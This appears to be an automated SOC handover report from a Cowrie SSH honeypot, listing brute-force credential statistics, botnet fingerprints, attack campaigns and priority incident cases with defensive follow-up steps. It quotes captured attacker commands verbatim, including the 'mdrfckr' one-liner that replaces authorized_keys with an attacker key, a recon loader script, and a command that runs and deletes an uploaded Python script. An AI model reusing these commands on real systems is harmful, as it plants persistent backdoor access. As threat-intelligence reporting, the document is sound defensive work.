# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-07 |
| **Generated At** | 2026-10-07T18:07:47Z |
| **Shift Time** | 18:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **378** |
| Confirmed Threats | **332** |
| False Positives Filtered | **46** (12.2%) |
| Unique Attacker IPs | **252** |
| Countries of Origin | **49** |
| High Severity Cases | **198** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **180** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 10 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3806** |
| Unique Credential Pairs | **3230** |
| Unique Usernames | **1759** |
| Unique Passwords | **1586** |
| Successful Auth Pairs | **3489** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 570 |
| `ubuntu` | 134 |
| `admin` | 74 |
| `345gs5662d34` | 70 |
| `user` | 49 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 119 |
| `345gs5662d34` | 70 |
| `3245gs5662d34` | 67 |
| `123` | 34 |
| `admin` | 34 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 70 |
| `support` | `support` | 29 |
| `admin` | `admin` | 24 |
| `root` | `123456` | 20 |
| `root` | `P@ssw0rd` | 17 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `vyos` | `vyos` | `77.239.124.143` | 2026-10-07T02:55:07 |
| `root` | `P@ssw0rd!` | `77.239.124.143` | 2026-10-07T02:55:12 |
| `minecraft` | `12345` | `77.239.124.143` | 2026-10-07T02:55:18 |
| `blab` | `blab` | `171.244.39.95` | 2026-10-07T02:55:20 |
| `root` | `P@ssw0rd123` | `77.239.124.143` | 2026-10-07T02:55:24 |
| `345gs5662d34` | `345gs5662d34` | `171.244.39.95` | 2026-10-07T02:55:25 |
| `blab` | `3245gs5662d34` | `171.244.39.95` | 2026-10-07T02:55:26 |
| `david` | `123456` | `77.239.124.143` | 2026-10-07T02:55:29 |
| `deploy` | `123123` | `77.239.124.143` | 2026-10-07T02:55:35 |
| `ame` | `ame` | `77.239.124.143` | 2026-10-07T02:55:40 |
| `user17` | `user17` | `77.239.124.143` | 2026-10-07T02:55:46 |
| `nitin` | `nitin` | `77.239.124.143` | 2026-10-07T02:55:52 |
| `newuser` | `123456` | `77.239.124.143` | 2026-10-07T02:55:57 |
| `root` | `pass` | `77.239.124.143` | 2026-10-07T02:56:03 |
| `kartik` | `kartik` | `163.7.3.154` | 2026-10-07T02:56:08 |
| `root` | `asdfghjk` | `77.239.124.143` | 2026-10-07T02:56:10 |
| `345gs5662d34` | `345gs5662d34` | `163.7.3.154` | 2026-10-07T02:56:13 |
| `kartik` | `3245gs5662d34` | `163.7.3.154` | 2026-10-07T02:56:15 |
| `rancher` | `rancher` | `77.239.124.143` | 2026-10-07T02:56:15 |
| `root` | `Welcome@123` | `77.239.124.143` | 2026-10-07T02:56:21 |
_… 3469 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **378** |
| Sessions with Fingerprint | **28** |
| Unique HASSH Fingerprints | **28** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 130 |
| Go SSH scanner | 73 |
| OpenSSH | 28 |
| Paramiko (Python) | 11 |
| Unknown | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 93 | 48 |
| `acaa53e0a7d7...` | Mirai/variant | 25 | 25 |
| `0a07365cc01f...` | Generic scanner | 18 | 6 |
| `03a80b21afa8...` | Modern SSH client | 17 | 10 |
| `2ec37a7cc8da...` | Mirai/variant | 12 | 5 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 93 | 48 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 25 | 25 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 18 | 6 | Generic scanner |
| `03a80b21afa8...` | libssh | 17 | 10 | Modern SSH client |
| `95420f9d932d...` | libssh | 15 | 14 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 12 | 5 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 12 | 4 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 9 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **20** |
| Campaign Clusters | **6** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 160 | 5 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 54 | 53 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 13 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 3 | 1 | `T1105, T1070, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "bpm\nnelrUrijVhli\nnelrUrijVhli"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `120.230.142.3`, `36.103.243.179`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`, `193.32.162.84`, `80.94.92.234`, `195.178.110.227`, `195.178.110.228`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `36.50.134.86`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **252** |
| Unique ASNs | **113** |
| High-Risk ASNs | **82** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 62 | HIGH |
| `AS4134` | CHINANET BACKBONE | 10 | HIGH |
| `AS396982` | Google LLC | 9 | HIGH |
| `AS398324` | Censys, Inc. | 8 | HIGH |
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS4811` | China Telecom (Group) | 6 | HIGH |
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (197)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5eb4871512e8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]143` |
| **First Seen** | 2026-10-07 02:55 |
| **Last Seen** | 2026-10-07 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 02:55:06` | `cowrie.session.connect` |
| `2026-10-07 02:55:06` | `cowrie.client.version` |
| `2026-10-07 02:55:06` | `cowrie.client.kex` |
| `2026-10-07 02:55:07` | `cowrie.login.success` |
| `2026-10-07 02:55:08` | `cowrie.session.params` |
| `2026-10-07 02:55:08` | `cowrie.command.input` |
| `2026-10-07 02:55:08` | `cowrie.log.closed` |
| `2026-10-07 02:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]143` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7131dc18c463

| Field | Detail |
|---|---|
| **Source IP** | `171.244.39[.]95` |
| **First Seen** | 2026-10-07 02:55 |
| **Last Seen** | 2026-10-07 02:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 02:55:19` | `cowrie.session.connect` |
| `2026-10-07 02:55:19` | `cowrie.client.version` |
| `2026-10-07 02:55:19` | `cowrie.client.kex` |
| `2026-10-07 02:55:20` | `cowrie.login.success` |
| `2026-10-07 02:55:21` | `cowrie.session.params` |
| `2026-10-07 02:55:21` | `cowrie.command.input` |
| `2026-10-07 02:55:21` | `cowrie.command.failed` |
| `2026-10-07 02:55:22` | `cowrie.log.closed` |
| `2026-10-07 02:55:22` | `cowrie.session.params` |
| `2026-10-07 02:55:22` | `cowrie.command.input` |
| `2026-10-07 02:55:23` | `cowrie.session.file_download` |
| `2026-10-07 02:55:23` | `cowrie.log.closed` |
| `2026-10-07 02:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.39[.]95` to AbuseIPDB if not already reported
- [ ] Block `171.244.39[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eb06c3c06a1

| Field | Detail |
|---|---|
| **Source IP** | `171.244.39[.]95` |
| **First Seen** | 2026-10-07 02:55 |
| **Last Seen** | 2026-10-07 02:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 02:55:23` | `cowrie.session.connect` |
| `2026-10-07 02:55:23` | `cowrie.client.version` |
| `2026-10-07 02:55:23` | `cowrie.client.kex` |
| `2026-10-07 02:55:25` | `cowrie.login.success` |
| `2026-10-07 02:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.39[.]95` to AbuseIPDB if not already reported
- [ ] Block `171.244.39[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cc0fb401ea0

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]154` |
| **First Seen** | 2026-10-07 02:56 |
| **Last Seen** | 2026-10-07 02:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 02:56:07` | `cowrie.session.connect` |
| `2026-10-07 02:56:07` | `cowrie.client.version` |
| `2026-10-07 02:56:07` | `cowrie.client.kex` |
| `2026-10-07 02:56:08` | `cowrie.login.success` |
| `2026-10-07 02:56:09` | `cowrie.session.params` |
| `2026-10-07 02:56:09` | `cowrie.command.input` |
| `2026-10-07 02:56:09` | `cowrie.command.failed` |
| `2026-10-07 02:56:10` | `cowrie.log.closed` |
| `2026-10-07 02:56:11` | `cowrie.session.params` |
| `2026-10-07 02:56:11` | `cowrie.command.input` |
| `2026-10-07 02:56:11` | `cowrie.session.file_download` |
| `2026-10-07 02:56:11` | `cowrie.log.closed` |
| `2026-10-07 02:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]154` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e94cd3e51f81

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]154` |
| **First Seen** | 2026-10-07 02:56 |
| **Last Seen** | 2026-10-07 02:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 02:56:12` | `cowrie.session.connect` |
| `2026-10-07 02:56:12` | `cowrie.client.version` |
| `2026-10-07 02:56:12` | `cowrie.client.kex` |
| `2026-10-07 02:56:13` | `cowrie.login.success` |
| `2026-10-07 02:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]154` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc48b9119523

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-10-07 02:56 |
| **Last Seen** | 2026-10-07 02:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 02:56:32` | `cowrie.session.connect` |
| `2026-10-07 02:56:32` | `cowrie.client.version` |
| `2026-10-07 02:56:32` | `cowrie.client.kex` |
| `2026-10-07 02:56:33` | `cowrie.login.success` |
| `2026-10-07 02:56:34` | `cowrie.session.params` |
| `2026-10-07 02:56:34` | `cowrie.command.input` |
| `2026-10-07 02:56:34` | `cowrie.command.failed` |
| `2026-10-07 02:56:35` | `cowrie.log.closed` |
| `2026-10-07 02:56:36` | `cowrie.session.params` |
| `2026-10-07 02:56:36` | `cowrie.command.input` |
| `2026-10-07 02:56:36` | `cowrie.session.file_download` |
| `2026-10-07 02:56:36` | `cowrie.log.closed` |
| `2026-10-07 02:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b74077b6c5b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-10-07 02:56 |
| **Last Seen** | 2026-10-07 02:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 02:56:36` | `cowrie.session.connect` |
| `2026-10-07 02:56:36` | `cowrie.client.version` |
| `2026-10-07 02:56:36` | `cowrie.client.kex` |
| `2026-10-07 02:56:37` | `cowrie.login.success` |
| `2026-10-07 02:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ca9f96771d5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-10-07 03:12 |
| **Last Seen** | 2026-10-07 03:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 03:12:27` | `cowrie.session.connect` |
| `2026-10-07 03:12:28` | `cowrie.client.version` |
| `2026-10-07 03:12:28` | `cowrie.client.kex` |
| `2026-10-07 03:12:30` | `cowrie.login.success` |
| `2026-10-07 03:12:32` | `cowrie.session.params` |
| `2026-10-07 03:12:32` | `cowrie.command.input` |
| `2026-10-07 03:12:32` | `cowrie.command.input` |
| `2026-10-07 03:12:32` | `cowrie.command.input` |
| `2026-10-07 03:12:32` | `cowrie.command.input` |
| `2026-10-07 03:12:32` | `cowrie.command.input` |
| `2026-10-07 03:12:32` | `cowrie.command.success` |
| `2026-10-07 03:12:32` | `cowrie.command.input` |
| `2026-10-07 03:12:32` | `cowrie.command.input` |
| `2026-10-07 03:12:32` | `cowrie.command.input` |
| `2026-10-07 03:12:32` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbd161532f2e

| Field | Detail |
|---|---|
| **Source IP** | `14.49.178[.]90` |
| **First Seen** | 2026-10-07 03:32 |
| **Last Seen** | 2026-10-07 03:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 03:32:03` | `cowrie.session.connect` |
| `2026-10-07 03:32:04` | `cowrie.client.version` |
| `2026-10-07 03:32:04` | `cowrie.client.kex` |
| `2026-10-07 03:32:06` | `cowrie.login.success` |
| `2026-10-07 03:32:07` | `cowrie.direct-tcpip.request` |
| `2026-10-07 03:32:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.49.178[.]90` to AbuseIPDB if not already reported
- [ ] Block `14.49.178[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb8d33a0ddc

| Field | Detail |
|---|---|
| **Source IP** | `31.173.66[.]222` |
| **First Seen** | 2026-10-07 03:32 |
| **Last Seen** | 2026-10-07 03:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 03:32:12` | `cowrie.session.connect` |
| `2026-10-07 03:32:12` | `cowrie.client.version` |
| `2026-10-07 03:32:12` | `cowrie.client.kex` |
| `2026-10-07 03:32:13` | `cowrie.login.success` |
| `2026-10-07 03:32:14` | `cowrie.direct-tcpip.request` |
| `2026-10-07 03:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.66[.]222` to AbuseIPDB if not already reported
- [ ] Block `31.173.66[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-681cc12d33c2

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-10-07 03:36 |
| **Last Seen** | 2026-10-07 03:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 03:36:45` | `cowrie.session.connect` |
| `2026-10-07 03:36:45` | `cowrie.client.version` |
| `2026-10-07 03:36:45` | `cowrie.client.kex` |
| `2026-10-07 03:36:45` | `cowrie.login.success` |
| `2026-10-07 03:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96d3a71548a4

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-10-07 03:36 |
| **Last Seen** | 2026-10-07 03:38 |
| **Session Duration** | 127s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 03:36:48` | `cowrie.session.connect` |
| `2026-10-07 03:36:48` | `cowrie.client.version` |
| `2026-10-07 03:36:48` | `cowrie.client.kex` |
| `2026-10-07 03:36:49` | `cowrie.login.success` |
| `2026-10-07 03:36:49` | `cowrie.session.file_upload` |
| `2026-10-07 03:36:51` | `cowrie.session.params` |
| `2026-10-07 03:36:51` | `cowrie.command.input` |
| `2026-10-07 03:36:51` | `cowrie.command.input` |
| `2026-10-07 03:36:51` | `cowrie.command.input` |
| `2026-10-07 03:36:51` | `cowrie.command.failed` |
| `2026-10-07 03:36:51` | `cowrie.log.closed` |
| `2026-10-07 03:36:51` | `cowrie.session.params` |
| `2026-10-07 03:36:51` | `cowrie.command.input` |
| `2026-10-07 03:36:52` | `cowrie.log.closed` |
| `2026-10-07 03:36:52` | `cowrie.session.params` |
| … | _9 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c862a800227

| Field | Detail |
|---|---|
| **Source IP** | `111.70.14[.]135` |
| **First Seen** | 2026-10-07 03:37 |
| **Last Seen** | 2026-10-07 03:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 03:37:45` | `cowrie.session.connect` |
| `2026-10-07 03:37:46` | `cowrie.client.version` |
| `2026-10-07 03:37:46` | `cowrie.client.kex` |
| `2026-10-07 03:37:48` | `cowrie.login.success` |
| `2026-10-07 03:37:49` | `cowrie.direct-tcpip.request` |
| `2026-10-07 03:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.14[.]135` to AbuseIPDB if not already reported
- [ ] Block `111.70.14[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-accba01bc91c

| Field | Detail |
|---|---|
| **Source IP** | `211.221.158[.]216` |
| **First Seen** | 2026-10-07 03:37 |
| **Last Seen** | 2026-10-07 03:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
